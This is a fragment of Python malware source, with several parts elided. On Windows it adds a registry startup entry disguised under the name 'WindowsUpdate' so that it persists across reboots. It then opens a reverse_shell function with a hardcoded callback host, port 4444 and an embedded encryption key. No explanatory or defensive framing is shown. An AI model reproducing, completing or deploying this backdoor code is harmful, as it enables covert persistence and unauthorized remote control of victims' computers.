...
def add_persistence():
    if platform.system() == "Windows":
        ...
        try:
            ...
            winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{os.path.abspath(__file__)}.exe"')
...
def reverse_shell(host="192.168.100.9", port=4444, key="lHMpfXbi2kdfRzKjvUyj-E-2IY4sWyF_EoCp2sU7siU="):
